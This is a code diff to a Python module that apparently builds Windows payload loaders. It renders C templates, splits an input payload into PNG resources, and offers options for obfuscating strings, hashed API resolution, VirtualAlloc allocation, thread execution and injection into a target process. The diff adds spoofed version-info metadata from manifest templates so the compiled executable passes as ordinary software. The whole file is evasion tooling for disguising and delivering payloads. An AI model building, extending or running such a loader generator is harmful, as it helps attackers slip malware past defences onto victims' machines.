@@ -4,6 +4,8 @@ import sys
 import uuid
 import importlib
 import random
+import json
+import re
 from jinja2 import Environment, FileSystemLoader
 from .png_chunker import chunk_bytecode_to_pngs
 
@@ -50,10 +52,21 @@ def _get_api_hashes():
         
     return hashes
 
-def _prepare_template_context(options, input_filepath):
+def _load_manifest_data():
+    """Loads and parses the manifest.json file for versioninfo template data"""
+    try:
+        manifest_path = os.path.join(os.path.dirname(__file__), 'manifest.json')
+        with open(manifest_path, 'r') as f:
+            return json.load(f)
+    except Exception as e:
+        print(f"ERROR: Could not load or parse manifest.json: {e}", file=sys.stderr)
+        return {"version_info_templates": {}}
+
+def _prepare_template_context(options, manifest_data, payload_bytes=None):
     """Prepares the complete dictionary of variables to be passed to the Jinja2 template."""
     template_vars = {}
     
+    # 1. Determine Global and Local Obfuscation Flags
     obfuscate_http_strings = options.get('obfuscate_http_strings') == 'true'
     obfuscate_execution_strings = options.get('obfuscate_execution_strings') == 'true'
     
@@ -64,16 +77,22 @@ def _prepare_template_context(options, input_filepath):
         key = random.randint(1, 255)
         template_vars['obfuscation_key'] = key
 
+    # 2. API Resolver Context
     api_resolver_choice = options.get('api_resolver', 'string')
     template_vars['api_resolver'] = api_resolver_choice
     template_vars['api_resolver_partial'] = f"partials/api_resolver_{api_resolver_choice}.c.j2"
     if api_resolver_choice == 'hashed':
         template_vars.update(_get_api_hashes())
 
+    # 3. Data Source Context
     data_source_choice = options.get('data_source', 'embedded')
     template_vars['data_source'] = data_source_choice
     if data_source_choice == 'embedded':
         template_vars['data_source_partial'] = "partials/datasource_image_chunks.c.j2"
+        if payload_bytes:
+            template_vars['embedded_data_size'] = len(payload_bytes)
+        else:
+            template_vars['embedded_data_size'] = 0
     else:
         template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
     
@@ -91,6 +110,7 @@ def _prepare_template_context(options, input_filepath):
             template_vars['user_agent'] = user_agent
         template_vars['trust_invalid_cert'] = 1 if options.get('trust_invalid_cert') == 'true' else 0
 
+    # 4. General Options
     output_format = options.get('output_format', 'exe')
     allocation_method_choice = options.get('allocation_method', 'virtualalloc')
     execution_method_choice = options.get('execution_method', 'newthread')
@@ -115,27 +135,127 @@ def _prepare_template_context(options, input_filepath):
         else:
             template_vars['target_process'] = target_process
     
+    # 5. Version Info Logic
+    template_vars['version_info_mode'] = 'none' 
+    selected_template_name = options.get('version_info_template_select')
+    
+    version_templates = manifest_data.get("version_info_templates", {})
+    sample_template = version_templates.get("exe", [{}])[0]
+    
+    final_version_info = {}
+
+    if selected_template_name:
+        template_vars['version_info_mode'] = 'template'
+        all_templates = version_templates.get(output_format, [])
+        selected_template = next((t for t in all_templates if t['name'] == selected_template_name), None)
+        
+        if selected_template:
+            for key in sample_template.keys():
+                if key == 'name': continue
+                final_version_info[f'version_info_{key}'] = selected_template.get(key, '')
+
+    elif options.get('version_info_company_name'):
+        template_vars['version_info_mode'] = 'custom'
+        for key in sample_template.keys():
+            if key == 'name': continue
+            final_version_info[f'version_info_{key}'] = options.get(f'version_info_{key}', '')
+    
+    if template_vars.get('version_info_mode') != 'none':
+        file_ver_str = final_version_info.get('version_info_file_version') or '1.0.0.1'
+        prod_ver_str = final_version_info.get('version_info_product_version') or '1.0.0.1'
+
+        file_ver_nums_match = re.search(r'[\d\.]+', file_ver_str)
+        prod_ver_nums_match = re.search(r'[\d\.]+', prod_ver_str)
+        template_vars['version_info_file_version_nums'] = file_ver_nums_match.group(0) if file_ver_nums_match else '1.0.0.1'
+        template_vars['version_info_product_version_nums'] = prod_ver_nums_match.group(0) if prod_ver_nums_match else '1.0.0.1'
+        
+        template_vars['version_info_file_version_str'] = file_ver_str
+        template_vars['version_info_product_version_str'] = prod_ver_str
+        
+        for key, val in final_version_info.items():
+            if key not in ['version_info_file_version', 'version_info_product_version']:
+                 template_vars[key] = val
+    
     return template_vars
 
-def _compile_png_resources(payload_bytes, temp_files_to_clean):
-    """Compiles embedded payload into multiple PNG resource object files."""
+def _run_subprocess(command, cwd, temp_file_to_debug=None, file_encoding='ascii'):
+    """A simplified helper to run subprocesses, assuming ASCII/default encoding."""
+    try:
+        result = subprocess.run(
+            command, check=True, capture_output=True, cwd=cwd, text=True, encoding=file_encoding, errors='replace'
+        )
+        print(result.stdout)
+    except subprocess.CalledProcessError as e:
+        stderr_output = e.stderr
+        print(f"ERROR: Build step failed. Stderr: {stderr_output}", file=sys.stderr)
+        
+        if temp_file_to_debug:
+            print(f"--- DEBUG: FAILED FILE CONTENT ({temp_file_to_debug}) ---", file=sys.stderr)
+            try:
+                with open(temp_file_to_debug, 'r', encoding=file_encoding) as f_err:
+                    print(f_err.read(), file=sys.stderr)
+            except Exception as read_e:
+                print(f"ERROR: Could not read failed file: {read_e}", file=sys.stderr)
+            print("--- END DEBUG ---", file=sys.stderr)
+        
+        raise Exception(f"C compilation failed: {stderr_output}")
+
+def _compile_payload_resources(payload_bytes, temp_files_to_clean):
+    """Compiles the payload chunks (PNGs) into a resource object file."""
+    if not payload_bytes:
+        return None
+
+    print("INFO: Compiling payload resources...")
     png_files = chunk_bytecode_to_pngs(payload_bytes, temp_files_to_clean)
-    rc_content = ""
+    rc_content_payload = ""
     for i, png_file in enumerate(png_files):
-        rc_content += f'im{i} RCDATA "{png_file}"\n'
+        rc_content_payload += f'im{i} RCDATA "{os.path.basename(png_file)}"\n'
     
-    temp_rc_filename = f"{uuid.uuid4()}.rc"
+    if not rc_content_payload:
+        return None
+
+    temp_rc_filename = f"{uuid.uuid4()}_payload.rc"
     temp_rc_filepath = os.path.join('/tmp/uploads', temp_rc_filename)
     temp_files_to_clean.append(temp_rc_filepath)
-    with open(temp_rc_filepath, "w") as f_rc:
-        f_rc.write(rc_content)
+    # Write as simple ASCII
+    with open(temp_rc_filepath, "w", encoding="ascii") as f_rc:
+        f_rc.write(rc_content_payload)
 
-    temp_res_o_filename = f"{uuid.uuid4()}.o"
+    temp_res_o_filename = f"{uuid.uuid4()}_payload.o"
     temp_res_o_filepath = os.path.join('/tmp/uploads', temp_res_o_filename)
     temp_files_to_clean.append(temp_res_o_filepath)
     windres_command = ["x86_64-w64-mingw32-windres", "-i", temp_rc_filepath, "-o", temp_res_o_filepath]
-    subprocess.run(windres_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
     
+    _run_subprocess(windres_command, '/tmp/uploads', temp_file_to_debug=temp_rc_filepath, file_encoding='ascii')
+    return temp_res_o_filepath
+
+def _compile_version_info_resource(template_vars, env, temp_files_to_clean):
+    """Compiles the Version Info into a separate resource object file."""
+    if template_vars.get('version_info_mode') == 'none':
+        return None
+
+    print("INFO: Compiling version info resource...")
+    try:
+        version_template = env.get_template('versioninfo.rc.j2')
+        rc_content_version = version_template.render(**template_vars)
+    except Exception as e:
+        print(f"ERROR: Failed to render versioninfo.rc.j2: {e}", file=sys.stderr)
+        return None
+
+    temp_rc_filename = f"{uuid.uuid4()}_version.rc"
+    temp_rc_filepath = os.path.join('/tmp/uploads', temp_rc_filename)
+    temp_files_to_clean.append(temp_rc_filepath)
+    
+    with open(temp_rc_filepath, "w", encoding="ascii") as f_rc:
+        f_rc.write(rc_content_version)
+
+    temp_res_o_filename = f"{uuid.uuid4()}_version.o"
+    temp_res_o_filepath = os.path.join('/tmp/uploads', temp_res_o_filename)
+    temp_files_to_clean.append(temp_res_o_filepath)
+    
+    windres_command = ["x86_64-w64-mingw32-windres", "-i", temp_rc_filepath, "-o", temp_res_o_filepath]
+    
+    _run_subprocess(windres_command, '/tmp/uploads', temp_file_to_debug=temp_rc_filepath, file_encoding='ascii')
     return temp_res_o_filepath
 
 def _compile_c_source(c_source_code, temp_files_to_clean):
@@ -143,15 +263,16 @@ def _compile_c_source(c_source_code, temp_files_to_clean):
     temp_c_filename = f"{uuid.uuid4()}.c"
     temp_c_filepath = os.path.join('/tmp/uploads', temp_c_filename)
     temp_files_to_clean.append(temp_c_filepath)
-    with open(temp_c_filepath, "w") as f:
+    with open(temp_c_filepath, "w", encoding="utf-8") as f:
         f.write(c_source_code)
         
     temp_c_o_filename = f"{uuid.uuid4()}.o"
     temp_c_o_filepath = os.path.join('/tmp/uploads', temp_c_o_filename)
     temp_files_to_clean.append(temp_c_o_filepath)
     compile_command = ["x86_64-w64-mingw32-gcc", "-O2", "-c", temp_c_filepath, "-o", temp_c_o_filepath]
+    
     print(f"INFO: Compiling C object with command: {' '.join(compile_command)}")
-    subprocess.run(compile_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
+    _run_subprocess(compile_command, '/tmp/uploads', temp_file_to_debug=temp_c_filepath, file_encoding='utf-8')
     
     return temp_c_o_filepath
 
@@ -185,7 +306,7 @@ def _link_objects(object_files, options, original_filename, temp_files_to_clean)
     linker_command.extend(["-o", output_artifact_filename])
     
     print(f"INFO: Linking with command: {' '.join(linker_command)}")
-    subprocess.run(linker_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
+    _run_subprocess(linker_command, '/tmp/uploads')
     
     return output_artifact_filename
 
@@ -196,16 +317,21 @@ def encode(input_filepath, original_filename, options):
     print(f"INFO: Starting high-level compilation orchestration for '{original_filename}'")
     temp_files_to_clean = []
     try:
-        template_vars = _prepare_template_context(options, input_filepath)
+        manifest_data = _load_manifest_data()
         
         payload_bytes = b""
         if options.get('data_source') == 'embedded':
-            with open(input_filepath, "rb") as f:
-                payload_bytes = f.read()
-            template_vars['embedded_data_size'] = len(payload_bytes)
+            if input_filepath and os.path.exists(input_filepath):
+                with open(input_filepath, "rb") as f:
+                    payload_bytes = f.read()
+            else:
+                print(f"WARN: input_filepath '{input_filepath}' not found or invalid, but data_source is 'embedded'.")
+        
+        template_vars = _prepare_template_context(options, manifest_data, payload_bytes)
         
         template_dir = os.path.join(os.path.dirname(__file__), 'templates')
         env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
+        
         template = env.get_template('base.c.j2')
         c_source_code = template.render(**template_vars)
 
@@ -213,8 +339,17 @@ def encode(input_filepath, original_filename, options):
         object_files_to_link = [c_object_path]
         
         if options.get('data_source') == 'embedded':
-            resource_object_path = _compile_png_resources(payload_bytes, temp_files_to_clean)
-            object_files_to_link.append(resource_object_path)
+            payload_resource_path = _compile_payload_resources(
+                payload_bytes, temp_files_to_clean
+            )
+            if payload_resource_path:
+                object_files_to_link.append(payload_resource_path)
+        
+        version_resource_path = _compile_version_info_resource(
+            template_vars, env, temp_files_to_clean
+        )
+        if version_resource_path:
+            object_files_to_link.append(version_resource_path)
             
         final_artifact_name = _link_objects(
             object_files_to_link, options, original_filename, temp_files_to_clean
@@ -223,9 +358,9 @@ def encode(input_filepath, original_filename, options):
         print(f"INFO: High-level compilation successful. Final artifact: {final_artifact_name}")
         return final_artifact_name
         
-    except subprocess.CalledProcessError as e:
-        print(f"ERROR: A build step failed. Stderr: {e.stderr}", file=sys.stderr)
-        raise Exception(f"C compilation failed: {e.stderr}")
+    except Exception as e:
+        print(f"ERROR: A build step failed. Full error: {e}", file=sys.stderr)
+        raise
     finally:
         print(f"INFO: Cleaning up {len(temp_files_to_clean)} temporary files.")
         for f_path in temp_files_to_clean:
